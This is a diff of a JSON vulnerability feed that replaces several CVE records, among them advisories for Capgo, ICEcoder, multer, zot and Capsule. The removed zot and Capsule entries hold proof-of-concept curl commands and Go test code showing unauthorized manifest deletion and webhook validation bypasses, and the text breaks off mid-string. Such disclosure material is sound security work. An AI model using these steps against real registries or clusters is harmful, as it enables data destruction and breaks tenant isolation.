+        "https://github.com/proma-ai/Proma"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-88861",
+      "summary": "Capgo (Cap-go/capgo.app) contains an authentication bypass affecting all versions (no patched version available at time of publication). The Edge authorization path allows a password-only Supabase aal1 session to exercise privileged RBAC permissions even when the account has a verified MFA factor that has not been used for the session: the Edge JWT middleware (foundJWT() in supabase/functions/_backend/utils/hono_middleware.ts) accepts the JWT without validating its assurance level, and the direct RBAC path (checkPermission()/checkPermissionPg() in supabase/functions/_backend/utils/rbac.ts calling public.rbac_check_permission_direct()) authorizes by user ID without passing or checking the session aal, unlike the public.verify_mfa() control which correctly requires aal2. An attacker who knows only the victim's password can therefore authenticate, mint a persistent app-scoped app_admin API key that remains valid after the aal1 session is logged out, and perform privileged operations such as modifying production OTA channel configurations (validated by changing a public production channel from bundle 1.0.0 to 1.0.1), defeating the protection provided by MFA.",
+      "cvssScore": 5.3,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-40530",
-        "https://www.synology.com/en-global/security/advisory/Synology_SA_26_06"
+        "https://github.com/Cap-go/capgo.app/security/advisories/GHSA-9435-5xw9-v29h",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-88861",
+        "https://www.vulncheck.com/advisories/capgo-aal1-session-mfa-bypass-via-direct-rbac-authorization"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1183",
-      "summary": "System Manager sysmgr GUI in SGI IRIX 6.4 and 6.3 allows remote attackers to execute commands by providing a trojan horse (1) runtask or (2) runexec descriptor file, which is used to execute a System Manager Task when the user's Mailcap entry supports the x-sgi-task or x-sgi-exec type.",
-      "cvssScore": 7.6,
+      "id": "CVE-2026-64836",
+      "summary": "ICEcoder versions through 8.1 contain a path traversal vulnerability in the file-control endpoint due to a logic error in the document-root confinement check. The File::check() validation function compares realpath() to boolean true, which never succeeds, allowing authenticated attackers to submit traversal sequences or absolute paths in the file parameter to read, write, or delete files outside the configured document root.",
+      "cvssScore": 7.1,
       "severity": "High",
-      "published": "1998-04-02",
+      "published": "2026-09-10",
+      "modified": "2026-09-10",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-64836",
+        "https://github.com/Caycon/cve-advisories/blob/main/2026/ICEcoder/CVE-2026-64836.md",
+        "https://github.com/icecoder/ICEcoder",
+        "https://github.com/icecoder/ICEcoder/blob/4a61847ef7bb0360735cf1d55c45e5de9746e24e/classes/File.php#L70",
+        "https://www.vulncheck.com/advisories/icecoder-through-8.1-path-traversal-via-ineffective-file-check-confinement"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1138",
+      "summary": "Microsoft SQL Server 7.0 and 2000, including Microsoft Data Engine (MSDE) 1.0 and Microsoft Desktop Engine (MSDE) 2000, writes output files for scheduled jobs under its own privileges instead of the entity that launched it, which allows attackers to overwrite system files, aka \"Flaw in Output File Handling for Scheduled Jobs.\"",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-10-11",
       "modified": null,
       "cwe": null,
       "references": [
-        "ftp://patches.sgi.com/support/free/security/advisories/19980403-01-PX",
-        "ftp://patches.sgi.com/support/free/security/advisories/19980403-02-PX",
-        "http://www.iss.net/security_center/static/809.php",
-        "http://www.osvdb.org/8556",
-        "ftp://patches.sgi.com/support/free/security/advisories/19980403-01-PX"
+        "http://www.ciac.org/ciac/bulletins/n-003.shtml",
+        "http://www.iss.net/security_center/static/10257.php",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-056",
+        "http://www.ciac.org/ciac/bulletins/n-003.shtml",
+        "http://www.iss.net/security_center/static/10257.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77078",
-      "summary": "### Impact\n\nA vulnerability in multer allows a remote, unauthenticated attacker to crash the Node.js process with a single `multipart/form-data` request. Two specially crafted text field names cause an uncaught `RangeError: Invalid array length` inside multer's field parsing, which is not routed to the application error handler and terminates the process. All applications using multer to parse multipart requests are affected.\n\n### Patches\n\nUsers should upgrade to `2.3.0`.\n\n### Workarounds\n\nNone.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2026-09-08",
-      "modified": "2026-09-08",
-      "cwe": {
-        "cwe_id": "CWE-248",
-        "name": "Uncaught Exception"
-      },
-      "references": [
-        "https://github.com/expressjs/multer/security/advisories/GHSA-wc9g-mqfw-jrwm",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77078",
-        "https://github.com/expressjs/multer/commit/87a584e8c8d4da873292635fa1d8c4d78d985b76",
-        "https://cna.openjsf.org/security-advisories.html",
-        "https://github.com/expressjs/multer/releases/tag/v2.3.0"
-      ],
-      "vulnerableProducts": [
-        "multer npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77037",
-      "summary": "### Impact\n\nA vulnerability in multer `2.2.0` allows an attacker to trigger a Denial of Service (DoS) by aborting or truncating multipart uploads. When using `diskStorage`, the destination write stream is not closed if the upload is aborted before it finishes, so each failed request leaks an open file descriptor and retains its disk blocks until the process exits. Repeated failed uploads can exhaust the available file descriptors. All applications using multer's disk storage are affected.\n\n### Patches\n\nUsers should upgrade to `2.3.0`.\n\n### Workarounds\n\nNone.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2026-09-08",
-      "modified": "2026-09-08",
-      "cwe": {
-        "cwe_id": "CWE-400",
-        "name": "Uncontrolled Resource Consumption"
-      },
-      "references": [
-        "https://github.com/expressjs/multer/security/advisories/GHSA-qfvm-cv95-jqjf",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77037",
-        "https://github.com/expressjs/multer/commit/eef74440b491ef0f976f3d25895e8089ae495df0",
-        "https://cna.openjsf.org/security-advisories.html",
-        "https://github.com/expressjs/multer/releases/tag/v2.3.0"
-      ],
-      "vulnerableProducts": [
-        "multer npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-61833",
-      "summary": "### Summary\n\nA bearer token with only `pull` and `push` scopes can successfully delete manifests and blobs from a zot registry. The bearer authentication handler maps all non-GET/HEAD HTTP methods, including DELETE, to the `\"push\"` action, and the `DistSpecAuthzHandler` middleware is bypassed entirely for bearer-authenticated requests. This allows any client holding a push-only bearer token to delete arbitrary manifests and blobs within the token's repository scope, in violation of the [Docker Distribution Token Authentication Specification](https://distribution.github.io/distribution/spec/auth/scope/).\n\n### Details\n\nThe vulnerability exists in two interacting components:\n\n**1. Action Mapping Collapse (`pkg/api/authn.go:571–586`)**\n\nThe bearer authentication handler maps HTTP methods to token scope actions using a binary check:\n\n```go\naction := \"pull\"\nif m := request.Method; m != http.MethodGet && m != http.MethodHead {\n    action = \"push\"\n}\n```\n\nThis collapses DELETE, PUT, PATCH, and POST into a single `\"push\"` action. The `\"delete\"` action is never assigned.\n\n**2. Authorization Bypass for Bearer Auth (`pkg/api/authz.go:270–275, 318–323`)**\n\nWhen a request is authenticated via bearer token, the `DistSpecAuthzHandler` middleware, which performs fine-grained action inference (distinguishing `create`, `read`, `update`, and `delete`) is bypassed entirely:\n\n```go\nif err != nil || (authnMwCtx != nil && authnMwCtx.AuthnType == BEARER) {\n    next.ServeHTTP(response, request)\n    return\n}\n```\n\n**3. No Handler-Level Authorization Check**\n\nNeither `DeleteManifest` (`routes.go:799–884`) nor `DeleteBlob` (`routes.go:1192–1241`) performs an independent authorization check for delete permission before executing the deletion.\n\n**Deviation from Specification and Reference Implementation**\n\nThe [[Docker Distribution Token Scope Documentation](https://distribution.github.io/distribution/spec/auth/scope/)](https://distribution.github.io/distribution/spec/auth/scope/) defines `delete` as a distinct action separate from `push`. The reference implementation ([[distribution/distribution](https://github.com/distribution/distribution/blob/main/registry/handlers/app.go)](https://github.com/distribution/distribution/blob/main/registry/handlers/app.go)) correctly maps DELETE requests to the `\"delete\"` action:\n\n```go\ncase http.MethodDelete:\n    records = append(records,\n        auth.Access{\n            Resource: resource,\n            Action:   \"delete\",\n        })\n```\n\nFurthermore, zot's own native access-control configuration explicitly distinguishes `delete` as a separate permission from `create` and `update`, confirming the project's intent that delete is a distinct authorization action.\n\n**Suggested Fix**\n\nIn `pkg/api/authn.go`, the action mapping should distinguish DELETE:\n\n```go\naction := \"pull\"\nswitch {\ncase m == http.MethodGet || m == http.MethodHead:\n    action = \"pull\"\ncase m == http.MethodDelete:\n    action = \"delete\"\ndefault:\n    action = \"push\"\n}\n```\n\nThe `DistSpecAuthzHandler` bypass for bearer-authenticated requests (`authz.go:270–275`) should also be reconsidered to ensure bearer-authenticated requests receive equivalently granular authorization checks.\n\n### PoC\n\n**Prerequisites:** zot v2.1.15 with bearer authentication enabled, and a token server issuing JWTs with `actions: [\"pull\", \"push\"]` (no `\"delete\"`).\n\n**Steps to Reproduce:**\n\n1. Configure zot with bearer authentication pointing to a token server\n2. Obtain a bearer token with scope `repository:poc-test:pull,push` (no delete)\n3. Upload a config blob:\n```bash\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/octet-stream\" \\\n  -X POST \"http://127.0.0.1:5001/v2/poc-test/blobs/uploads/?digest=sha256:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a\" \\\n  -d '{}'\n# → 201 Created\n```\n4. Push a manifest tagged `v1.0` (succeeds token has push):\n```bash\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/vnd.oci.image.manifest.v1+json\" \\\n  -X PUT \"http://127.0.0.1:5001/v2/poc-test/manifests/v1.0\" \\\n  -d '{\"schemaVersion\":2,\"mediaType\":\"application/vnd.oci.image.manifest.v1+json\",\"config\":{\"mediaType\":\"application/vnd.oci.image.config.v1+json\",\"digest\":\"sha256:44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a\",\"size\":2},\"layers\":[]}'\n# → 201 Created\n```\n5. DELETE the manifest with the same push-only token (**should return 401, but returns 202**):\n```bash\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n  -X DELETE \"http://127.0.0.1:5001/v2/poc-test/manifests/v1.0\"\n# → 202 Accepted (VULNERABLE)\n```\n6. Confirm the manifest is gone:\n```bash\ncurl -o /dev/null -w \"%{http_code}\" -H \"Authorization: Bearer $TOKEN\" \\\n  \"http://127.0.0.1:5001/v2/poc-test/manifests/v1.0\"\n# → 404 Not Found\n```\n\n**Expected behavior:** Step 5 should return `401 Unauthorized` with a `WWW-Authenticate` header requesting `scope=\"repository:poc-test:delete\"`.\n\n**Actual behavior:** Step 5 returns `202 Accepted` and the manifest is permanently deleted.\n\nA complete reproducer (minimal Go token server + zot config + automated script) is available upon request.\n\n### Impact\n\n**Privilege Escalation / Unauthorized Deletion** Any bearer token with push scope can delete manifests and blobs, even when the token was explicitly issued without delete permissions.\n\nThis is particularly impactful in CI/CD environments where automated systems are issued least-privilege tokens with only pull and push permissions. A compromised or stolen CI token which should only be able to build and push images can be used to:\n\n- Delete arbitrary manifests (tags) within any repository covered by the token's scope\n- Delete arbitrary blobs within those repositories\n- Render production container images unpullable\n- Rewrite image history by removing specific tags",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-285",
-        "name": "Improper Authorization"
-      },
-      "references": [
-        "https://github.com/project-zot/zot/security/advisories/GHSA-qg67-7m6v-qg25",
-        "https://github.com/project-zot/zot/pull/4161",
-        "https://github.com/project-zot/zot/commit/7bb211bcd4352b90f3e99752607fbd1f050bf7ca",
-        "https://github.com/project-zot/zot/releases/tag/v2.1.18",
-        "https://github.com/advisories/GHSA-qg67-7m6v-qg25"
-      ],
-      "vulnerableProducts": [
-        "zotregistry.dev/zot/v2 go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-61795",
-      "summary": "### Summary\n\nA parameter order bug in `internal/webhook/tenant/validation/hostname_regex.go` causes the `hostnameRegexHandler.OnUpdate` webhook to validate the **old** Tenant object's `AllowedHostnames.Regex` instead of the **new** one being submitted. This allows an invalid (malformed) regex to bypass admission validation and be persisted to etcd, causing a Denial of Service for all Ingress operations within the affected tenant.\n\n### Details\n\nThe `TypedHandler[T]` interface defines `OnUpdate` as:\n\n```go\n// handlers.go\nOnUpdate(c client.Client, reader client.Reader, obj T, old T, decoder admission.Decoder, recorder events.EventRecorder) Func\n//                                               ^^^ NEW  ^^^ OLD\n```\n\nThe dispatcher in `handler.go:93` calls:\n```go\nhndl.OnUpdate(c, reader, tnt, old, decoder, recorder)\n//                        ^^^ NEW  ^^^ OLD\n```\n\nHowever, `hostnameRegexHandler.OnUpdate` in `hostname_regex.go` declares its parameters in **reversed order**:\n\n```go\n// hostname_regex.go (BUGGY)\nfunc (h *hostnameRegexHandler) OnUpdate(\n    _ client.Client,\n    _ client.Reader,\n    old *capsulev1beta2.Tenant,   // ← receives NEW tenant (mislabeled as old)\n    tnt *capsulev1beta2.Tenant,   // ← receives OLD tenant (mislabeled as tnt)\n    ...\n) handlers.Func {\n    return func(...) *admission.Response {\n        if err := h.validate(tnt, req); err != nil { // ← validates OLD, not NEW\n            return err\n        }\n        return nil\n    }\n}\n```\n\nAll 11 other handlers in the same package declare `(tnt, old)` correctly. `hostname_regex.go` is the only one with the swap.\n\nAs a result, when a Cluster Admin updates `Tenant.Spec.IngressOptions.AllowedHostnames.Regex` to a malformed value, the webhook compiles the **previous valid regex** and returns `Allow`. The malformed regex is then written to etcd.\n\nSubsequently, every Ingress `CREATE` or `UPDATE` in that tenant triggers `validate_hostnames.go:160`:\n\n```go\nmatched, _ = regexp.MatchString(allowedRegex, currentHostname)\n```\n\n`regexp.MatchString` with an invalid pattern returns `(false, error)`. The error is silently ignored, `matched` is `false`, and **every hostname is rejected** — blocking all Ingress operations in the tenant until the Tenant object is manually corrected by an admin.\n\n### PoC\n\n```\n//go:build ignore\n// Standalone reproducer for hostname_regex.go argument swap bug in Capsule\n// No external deps - shows the bug logic using only stdlib\n\npackage main\n\nimport (\n\t\"fmt\"\n\t\"regexp\"\n)\n\n// Simulating the Tenant spec structure\ntype AllowedHostnames struct {\n\tRegex string\n}\n\ntype IngressOptions struct {\n\tAllowedHostnames *AllowedHostnames\n}\n\ntype TenantSpec struct {\n\tIngressOptions IngressOptions\n}\n\ntype Tenant struct {\n\tName string\n\tSpec TenantSpec\n}\n\n// =========================================================\n// BUGGY implementation (hostname_regex.go as-is)\n// OnUpdate(_, _, old *Tenant, tnt *Tenant) → validates OLD\n// =========================================================\nfunc hostnameValidate(tnt *Tenant) error {\n\tif tnt.Spec.IngressOptions.AllowedHostnames == nil {\n\t\treturn nil\n\t}\n\tif len(tnt.Spec.IngressOptions.AllowedHostnames.Regex) == 0 {\n\t\treturn nil\n\t}\n\t_, err := regexp.Compile(tnt.Spec.IngressOptions.AllowedHostnames.Regex)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"Deny: unable to compile allowedHostnames allowedRegex\")\n\t}\n\treturn nil\n}\n\n// Dispatcher calls: OnUpdate(c, reader, newTenant, oldTenant, ...)\n// Interface says:   OnUpdate(c, reader, obj[NEW], old[OLD], ...)\n//\n// BUGGY handler receives: (old, tnt) meaning:\n//   3rd param (labeled \"old\") = actually NEW\n//   4th param (labeled \"tnt\") = actually OLD\n// Then calls h.validate(tnt) = validates the OLD tenant\nfunc buggyOnUpdate(newTenant, oldTenant *Tenant) error {\n\t// BUG: parameters are SWAPPED vs the interface contract\n\told := newTenant // dispatcher's \"new\" arrives as \"old\" in this function\n\ttnt := oldTenant // dispatcher's \"old\" arrives as \"tnt\" in this function\n\t_ = old          // unused in the real code too\n\treturn hostnameValidate(tnt) // validates OLD, not NEW\n}\n\n// CORRECT implementation (what it should be)\nfunc correctOnUpdate(newTenant, oldTenant *Tenant) error {\n\t_ = oldTenant\n\treturn hostnameValidate(newTenant) // validates NEW\n}\n\n// Simulate ingress hostname validation AFTER bad regex is stored\nfunc validateIngressHostname(tenant *Tenant, hostname string) bool {\n\tif tenant.Spec.IngressOptions.AllowedHostnames == nil {\n\t\treturn true\n\t}\n\tallowedRegex := tenant.Spec.IngressOptions.AllowedHostnames.Regex\n\tif len(allowedRegex) == 0 {\n\t\treturn true\n\t}\n\t// This is validate_hostnames.go:160 - error is IGNORED\n\tmatched, _ := regexp.MatchString(allowedRegex, hostname)\n\treturn matched\n}\n\nfunc main() {\n\tfmt.Println(\"=== Capsule Bug Reproducer: hostname_regex.go argument swap ===\")\n\tfmt.Println()\n\n\toldTenant := &Tenant{\n\t\tName: \"demo-tenant\",\n\t\tSpec: TenantSpec{\n\t\t\tIngressOptions: IngressOptions{\n\t\t\t\tAllowedHostnames: &AllowedHostnames{\n\t\t\t\t\tRegex: `^[\\w.-]+\\.example\\.com$`, // valid regex\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t}\n\n\t// Attacker (cluster admin) sets an INVALID regex in the new spec\n\tnewTenant := &Tenant{\n\t\tName: \"demo-tenant\",\n\t\tSpec: TenantSpec{\n\t\t\tIngressOptions: IngressOptions{\n\t\t\t\tAllowedHostnames: &AllowedHostnames{\n\t\t\t\t\tRegex: `[invalid-regex(`, // INVALID regex\n\t\t\t\t},\n\t\t\t},\n\t\t},\n\t}\n\n\tfmt.Printf(\"Old tenant regex: %q (valid)\\n\", oldTenant.Spec.IngressOptions.AllowedHostnames.Regex)\n\tfmt.Printf(\"New tenant regex: %q (INVALID)\\n\", newTenant.Spec.IngressOptions.AllowedHostnames.Regex)\n\tfmt.Println()\n\n\t// Step 1: Webhook runs OnUpdate\n\tfmt.Println(\"--- Step 1: Webhook OnUpdate ---\")\n\n\terr := buggyOnUpdate(newTenant, oldTenant)\n\tif err != nil {\n\t\tfmt.Printf(\"[BUGGY]   Webhook DENIES update: %v\\n\", err)\n\t} else {\n\t\tfmt.Println(\"[BUGGY]   Webhook ALLOWS update (validates OLD regex) ← WRONG\")\n\t}\n\n\terr = correctOnUpdate(newTenant, oldTenant)\n\tif err != nil {\n\t\tfmt.Printf(\"[CORRECT] Webhook DENIES update: %v ← EXPECTED\\n\", err)\n\t} else {\n\t\tfmt.Println(\"[CORRECT] Webhook ALLOWS update\")\n\t}\n\n\t// Step 2: Invalid regex now stored in etcd - simulate ingress validation\n\tfmt.Println()\n\tfmt.Println(\"--- Step 2: Ingress creation after bad regex stored ---\")\n\tstoredTenant := newTenant // bad regex is now in etcd\n\n\thostnames := []string{\n\t\t\"app.example.com\",\n\t\t\"api.example.com\",\n\t\t\"evil.attacker.com\",\n\t}\n\n\tfor _, h := range hostnames {\n\t\tallowed := validateIngressHostname(storedTenant, h)\n\t\tfmt.Printf(\"  Ingress hostname %q → allowed=%v\", h, allowed)\n\t\tif !allowed {\n\t\t\tfmt.Print(\"  ← BLOCKED (DoS: invalid regex causes all hostnames to fail)\")\n\t\t}\n\t\tfmt.Println()\n\t}\n\n\tfmt.Println()\n\tfmt.Println(\"=== Result ===\")\n\tfmt.Println(\"Invalid regex bypasses webhook validation and gets stored.\")\n\tfmt.Println(\"All subsequent Ingress create/update in this tenant are BLOCKED.\")\n\tfmt.Println(\"CWE-697: Incorrect Comparison — wrong Tenant object is validated.\")\n}\n```\n\n```go\n// Simulates the buggy webhook behaviour\noldTenant := &Tenant{AllowedRegex: `^[\\w-]+\\.example\\.com$`} // valid\nnewTenant := &Tenant{AllowedRegex: `[invalid-regex(`}         // malformed\n\n// Buggy OnUpdate: validates oldTenant (valid) → ALLOW\n// Correct OnUpdate: validates newTenant (invalid) → DENY\n\n// After malformed regex is stored, all ingress hostnames are rejected:\nmatched, _ := regexp.MatchString(`[invalid-regex(`, \"app.example.com\")\n// matched = false, error ignored → Ingress blocked\n```\n\n### Fix\n\nSwap the parameter names in `hostname_regex.go` to match the interface contract:\n\n```go\n// BEFORE (buggy)\nfunc (h *hostnameRegexHandler) OnUpdate(\n    _ client.Client,\n    _ client.Reader,\n    old *capsulev1beta2.Tenant,\n    tnt *capsulev1beta2.Tenant,\n    ...\n\n// AFTER (fixed)\nfunc (h *hostnameRegexHandler) OnUpdate(\n    _ client.Client,\n    _ client.Reader,\n    tnt *capsulev1beta2.Tenant,\n    old *capsulev1beta2.Tenant,\n    ...\n```\n\n### Impact\n\nA Cluster Admin (or a compromised admin account) can — intentionally or via a typo — set a malformed `AllowedHostnames.Regex` on any Tenant. The webhook silently accepts the update. All users in the affected tenant are subsequently unable to create or update any Ingress resource until an admin manually corrects the Tenant spec. This constitutes a targeted Denial of Service against the tenant's ingress layer.",
-      "cvssScore": 6.8,
+      "id": "CVE-2002-1139",
+      "summary": "The Compressed Folders feature in Microsoft Windows 98 with Plus! Pack, Windows Me, and Windows XP does not properly check the destination folder during the decompression of ZIP files, which allows attackers to place an executable file in a known location on a user's system, aka \"Incorrect Target Path for Zipped File Decompression.\"",
+      "cvssScore": 5,
       "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-697",
-        "name": "Incorrect Comparison"
-      },
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/projectcapsule/capsule/security/advisories/GHSA-f94q-w3w8-cj67",
-        "https://github.com/projectcapsule/capsule/pull/1983",
-        "https://github.com/projectcapsule/capsule/commit/8d89d6865df6f41c7faa22fc9e807a57b01bfd0e",
-        "https://github.com/projectcapsule/capsule/releases/tag/v0.13.7",
-        "https://github.com/advisories/GHSA-f94q-w3w8-cj67"
+        "http://www.iss.net/security_center/static/10252.php",
+        "http://www.securityfocus.com/bid/5876",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/ms02-054",
+        "http://www.iss.net/security_center/static/10252.php",
+        "http://www.securityfocus.com/bid/5876"
       ],
-      "vulnerableProducts": [
-        "github.com/projectcapsule/capsule go"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-61672",
-      "summary": "## Summary\n\nCapsule lets a cluster administrator forbid specific metadata keys that tenant owners must not place on their own resources: `Tenant.spec.namespaceOptions.forbiddenLabels` / `forbiddenAnnotations` (namespaces), `Tenant.spec.serviceOptions.forbiddenLabels` / `forbiddenAnnotations` (Services), and the cluster-wide forbidden worker-node labels/annotations. These lists are an isolation control — they exist to stop a tenant owner from setting metadata that other controllers or admission plugins key on (Pod Security Admission labels, `kubernetes.io/metadata.name`, LoadBalancer/externalIP service annotations, scheduler annotations, vendor labels that grant network reach, etc.). The validating webhooks enforce them through `api.ValidateForbidden`, which calls `ForbiddenListSpec.ExactMatch(key)` for every key the tenant submits.\n\n`ExactMatch` is broken. It sorts the denied list **case-insensitively** (`sort.SliceStable` with a `strings.ToLower` comparator) and then performs a **byte-order binary search** (`sort.SearchStrings`) over the result. `sort.SearchStrings` is only correct on a slice sorted in plain byte-ascending order. Whenever the denied list contains an entry whose case-insensitive position differs from its byte position — which happens any time the list mixes a capitalised key with lowercase keys, because ASCII uppercase letters (0x41–0x5A) sort *before* lowercase (0x61–0x7A) by byte but are interleaved by `ToLower` — the binary search lands on the wrong index and `ExactMatch` returns **false for a key that is literally present in the denied list**. The webhook then *allows* the forbidden metadata.\n\nA tenant owner (who legitimately holds patch/create rights on their own tenant-owned namespaces and Services) can therefore set a metadata key the administrator explicitly forbade, defeating the control and reaching metadata-driven cross-tenant / system effects of exactly the kind Capsule's forbidden lists are meant to prevent. The bug is deterministic, requires no race, and is present unchanged on `main` HEAD.\n\n## Affected code (v0.13.5)\n\n`pkg/api/forbidden_list.go` — the comparison primitive:\n\n```go\nfunc (in ForbiddenListSpec) ExactMatch(value string) (ok bool) {\n\tif len(in.Exact) > 0 {\n\t\tsort.SliceStable(in.Exact, func(i, j int) bool {\n\t\t\treturn strings.ToLower(in.Exact[i]) < strings.ToLower(in.Exact[j]) // case-INSENSITIVE order\n\t\t})\n\n\t\ti := sort.SearchStrings(in.Exact, value) // binary search assuming BYTE order\n\n\t\tok = i < len(in.Exact) && in.Exact[i] == value\n\t}\n\n\treturn ok\n}\n```\n\n`sort.SearchStrings` returns the smallest index `i` such that `in.Exact[i] >= value` under raw byte comparison. If the slice is not byte-sorted, that index is wrong and the subsequent `in.Exact[i] == value` equality check fails even though `value` is in the slice — a false \"not forbidden\".\n\n`pkg/api/forbidden_list.go` — the public entry point the webhooks call:\n\n```go\nfunc ValidateForbidden(metadata map[string]string, forbiddenList ForbiddenListSpec) error {\n\tif reflect.DeepEqual(ForbiddenListSpec{}, forbiddenList) {\n\t\treturn nil\n\t}\n\tfor key := range metadata {\n\t\tvar forbidden, matched bool\n\t\tforbidden = forbiddenList.ExactMatch(key)   // <-- buggy\n\t\tmatched = forbiddenList.RegexMatch(key)\n\t\tif forbidden || matched {\n\t\t\treturn NewForbiddenError(key, forbiddenList)\n\t\t}\n\t}\n\treturn nil\n}\n```\n\nReached from (all in `internal/webhook/`):\n\n- `namespace/validation/user_metadata.go` → `validateUserMetadata` → `api.ValidateForbidden(labels, options.ForbiddenLabels)` and `api.ValidateForbidden(annotations, options.ForbiddenAnnotations)`.\n- `service/validating.go` → `api.ValidateForbidden(svc.Labels, tnt.Spec.ServiceOptions.ForbiddenLabels)` and `...ForbiddenAnnotations`.\n- `node/user_metadata.go` → `getForbiddenNodeLabels` / `getForbiddenNodeAnnotations` call `forbiddenLabels.ExactMatch(...)` directly.\n\n(The sibling allow-list primitive `AllowedListSpec.ExactMatch` in `pkg/api/allowed_list.go` has the identical defect, but there the polarity is fail-closed — a missed match wrongly *denies* an allowed class — so it is a correctness annoyance, not a security bypass. The forbidden-list polarity is the one that fails open.)\n\n## Attacker model / precondition\n\nThe attacker is a **tenant owner** — an authenticated, non-cluster-admin principal who already holds Capsule's delegated rights to create/patch their own tenant-owned namespaces and the Services within them (the normal Capsule tenancy model). No additional Kubernetes privilege is required.\n\nThe single deployment precondition that bounds severity: the administrator's denied list must contain at least one entry whose case-insensitive sort order diverges from its byte order — in practice, **the list mixes at least one capitalised key with lowercase keys** (or contains non-ASCII keys). A list that is uniformly lowercase (the most common shape) sorts identically under both orders and is *not* affected; an empty list (the chart default) is not affected. Mixed-case denied lists are entirely realistic, however: administrators routinely deny vendor/product-capitalised keys (e.g. `OwnerReference`, `NetworkPolicy`, CamelCase operator labels) alongside lowercase `kubernetes.io/...` keys. Once a single CamelCase entry is present, the broken binary search can also drop *lowercase* entries that share no resemblance to it — in the PoC below, adding a `NetworkPolicy` entry causes the unrelated lowercase `kubernetes.io/metadata.name` entry to escape as well. Any such list silently develops one or more exploitable gaps, and the defender cannot tell from the configuration that enforcement is partially disabled — the webhook reports success.\n\nOnce the precondition holds, exploitation is deterministic and needs only a single `kubectl label`/`kubectl annotate` (or create) on a resource the tenant already controls.\n\n## Impact\n\nThe administrator's forbidden-metadata isolation control is partially and silently bypassable. Concrete consequences depend on which key the gap exposes, but all of them are precisely what the control was configured to stop:\n\n- **Namespace labels/annotations:** a tenant owner sets a label the admin forbade onto a tenant namespace — e.g. a Pod Security Admission `pod-security.kubernetes.io/enforce` override, a `kubernetes.io/metadata.name`-class identity label, or a label that a cluster NetworkPolicy / external controller selects on — re-introducing the multi-tenant-isolation break that Capsule's forbidden-label feature exists to prevent (the same class as the previously-fixed namespace-label-injection isolation issue).\n- **Service labels/annotations:** a tenant owner sets a forbidden Service annotation — e.g. a cloud LoadBalancer / `externalIPs` / internal-LB provider annotation the admin denied — influencing network exposure outside the tenant boundary.\n- **Node labels/annotations:** for tenants granted node-patch rights, a forbidden node label that the admin meant to protect can be modified, affecting scheduling/topology decisions cluster-wide.\n\nScope is Changed (the webhook protects resources and effects beyond the tenant's own boundary), confidentiality/integrity impact is real but gated by the mixed-case precondition and by which specific key the gap exposes — hence Medium, not High.\n\n## Proof of Concept (complete — runs on 127.0.0.1 only)\n\nThis PoC drives the *real* Capsule decision code (`pkg/api`) — the exact function the namespace/service/node webhooks call — with no network and no cluster. It demonstrates the bypass with a realistic mixed-case denied list and includes positive and negative controls so the result is unambiguous.\n\nStep 1 — fetch the exact source under test (offline thereafter):\n\n```bash\ngit clone --depth 1 --branch v0.13.5 https://github.com/projectcapsule/capsule.git\ncd capsule\ngit rev-parse HEAD   # expect 34262c5536604762090144b6f8aed3ef2780c18c\n```\n\nStep 2 — drop this test into the package under test, `pkg/api/forbidden_bypass_poc_test.go`. The denied list is a realistic three-key administrator policy: deny the namespace identity label `kubernetes.io/metadata.name`, the Pod Security Admission label `pod-security.kubernetes.io/enforce`, and a CamelCase `NetworkPolicy` label:\n\n```go\npackage api\n\nimport \"testing\"\n\n// Realistic admin policy: forbid three sensitive metadata keys.\nfunc denied() ForbiddenListSpec {\n\treturn ForbiddenListSpec{\n\t\tExact: []string{\n\t\t\t\"kubernetes.io/metadata.name\",\n\t\t\t\"pod-security.kubernetes.io/enforce\",\n\t\t\t\"NetworkPolicy\",\n\t\t},\n\t}\n}\n\n// The bug: keys that ARE in the denied list slip through ValidateForbidden,\n// i.e. the webhook would ALLOW forbidden metadata the tenant submits.\nfunc TestPoC_ForbiddenKeysBypassed(t *testing.T) {\n\tfor _, k := range []string{\"NetworkPolicy\", \"kubernetes.io/metadata.name\"} {\n\t\tif err := ValidateForbidden(map[string]string{k: \"owned\"}, denied()); err == nil {\n\t\t\tt.Errorf(\"BYPASS CONFIRMED: ValidateForbidden ALLOWED denied key %q (list=%v)\", k, denied().Exact)\n\t\t} else {\n\t\t\tt.Logf(\"(no bypass) correctly denied %q: %v\", k, 